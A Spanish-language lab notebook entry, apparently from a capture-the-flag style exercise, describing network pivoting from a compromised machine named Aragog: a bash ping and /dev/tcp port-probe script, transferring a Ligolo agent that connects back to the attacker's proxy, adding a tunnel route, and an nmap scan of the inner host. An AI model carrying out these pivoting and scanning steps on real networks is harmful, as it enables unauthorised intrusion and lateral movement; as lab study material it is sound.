#Aragog
[[192.168.1.23 (Aragog)]]
- Pwned

En el directorio `/tmp` creamos un fichero llamo `hostDiscovery.sh` que nos permitirá hacer un reconocimiento de red sobre esa interfaz para encontrar host activos:
El script lo que hace directamente es buscar sobre las IP que respondan a una llamada y tengan puertos activos.
```shell
#!/bin/bash

# Función para escanear puertos de un host activo
scan_host() {
    local host=$1
    for port in 21 22 80 443 445 8080; do
        # Intenta conectarse al puerto con timeout
        timeout 1 bash -c "echo > /dev/tcp/$host/$port" &>/dev/null && \
            echo "[+] Host $host - PORT $port - OPEN"
    done
}

# Capturar Ctrl+C para salir limpio
trap "echo -e '\n[*] Escaneo interrumpido'; exit" SIGINT

for i in $(seq 1 254); do
    host="10.10.0.$i"
    # Comprobar si el host está activo
    if ping -c 1 -W 1 $host &>/dev/null; then
        echo "[*] Host $host activo. Escaneando puertos..."
        scan_host $host
    fi
done
```

Lo ejecutamos y nos dará la otra ip que se ve desde nuestra interfaz de red [[10.10.0.4 (Aragog)]]
Vemos que hay una IP del otro lado que es la `10.10.0.5`

Usaremos `Ligolo` para hacer la tunelización el agent tiene que ir en la maquina victima y el proxy en la maquina atacante 

El agent lo transferimos a la maquina victima a través de Python
`python3 -m http.server 80`

Deberemos ejecutar el proxy en nuestra maquina atacante con:
`./proxy -selfcert `

Y en la maquina victima el agent con:
`./agent -connect 192.168.1.19:11601 -ignore-cert`

Levantamos la interfaz de ligolo
`sudo ip tuntap add user jalag mode tun ligolo`
`sudo ip link set ligolo up`

En ligolo seleccionamos la sesión con `session` y le damos al Intro
Ejecutamos el comando `start` para que se inicie el tunelizado hacia la maquina victima [[10.10.0.4 (Aragog)]]

Tendremos que añadir la ruta a nustra maquina atacante para poder tener conexion con ella:
`sudo ip route add 10.10.0.0/24 dev ligolo`

Una vez hallamos conseguido el tunelizado haremos un scaneo con [[NMAP]] para ver los puertos abiertos:
`nmap -sT -Pn --top-ports 500 --open -T5 -v -n 10.10.0.5`

```python
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```






